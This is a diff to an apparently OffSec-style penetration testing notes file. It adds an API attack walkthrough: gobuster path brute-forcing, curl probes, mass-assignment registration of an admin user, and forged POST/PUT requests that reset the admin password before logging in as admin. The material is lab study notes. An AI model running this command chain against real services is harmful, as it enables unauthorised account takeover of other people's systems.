@@ -607,7 +607,7 @@ sudo namp --script-updatedb
 
 # Web Apps
 
-### Enum
+## Enum
 Inspect:
 - URLs
 - Page Content
@@ -635,6 +635,7 @@ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
 ```
 
 
+
 ### [dirb](Tools.md#dirb) - removed
 ```bash
 dirb http://<domain> -r -z 10
@@ -648,7 +649,94 @@ nikto -host=http://<domain> -maxtime=30s
 ### [sublist3r](Tools.md#Sublist3r) - removed
 
 
-### Admin Consoles
+## APIs
+
+### via Cmdline
+
+##### Create 'pattern' file for brute forcing API names
+```bash
+cat > pattern
+	{GOBUSTER}/v1
+	{GOBUSTER}/v2
+	... etc
+	#Ctrl D
+```
+
+##### Enumerate API with pattern file
+```bash
+gobuster dir -u http://<ip>:<API_port> -w /usr/share/wordlists/dirb/big.txt -p pattern
+```
+
+##### Inspect discovered API
+```
+curl -i http://<ip>:<API_port>/users/v1
+```
+
+##### Target users discovered
+```bash
+gobuster dir -u http://<ip>:<API_port>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+```
+
+##### Probe via curl
+```bash
+curl -i http://<ip>:<API_port>/users/v1/admin/password
+```
+
+##### Check if *login* method is supported
+```bash
+curl -i http://<ip>:<API_port>/users/vi/login
+```
+
+##### Convert GET to POST and push payload in req'd JSON format
+```bash
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/login
+```
+
+##### Check and attempt *register* method is supported and register a new user
+```bash
+curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/register
+```
+
+##### Add email for successful registry of new user and abuse possible *admin* key
+```bash
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/register
+```
+
+##### Test newly created user by logging in
+```bash
+curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/login
+```
+	Receive JWT token if successful
+
+##### Change admin user's pw forging a POST request targeting that *password* API
+```bash
+curl \
+'http://<ip>:<API_port>/users/v1/admin/password' \
+-H 'Content-Type: application/json' \
+-H 'Authorization: OAuth <JWT token from logging in ^>' \
+-d '{"password":"pwned"}'
+```
+
+##### Attempt above using PUT method
+```bash
+curl -X 'PUT' \
+'http://<ip>:<API_port>/users/v1/admin/password' \
+-H 'Content-Type: application/json' \
+-H 'Authorization: OAuth <JWT token from logging in ^^>' \
+-d '{"password":"pwned"}'
+```
+
+##### Login w/ admin's newly-changed pw
+```bash
+curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' http://<ip>:<API_port>/users/v1/login
+```
+
+
+## via BurpSuite
+
+
+
+## Admin Consoles
 
 #### [BurpSuite](burpsuite.md)
 	Intruderd
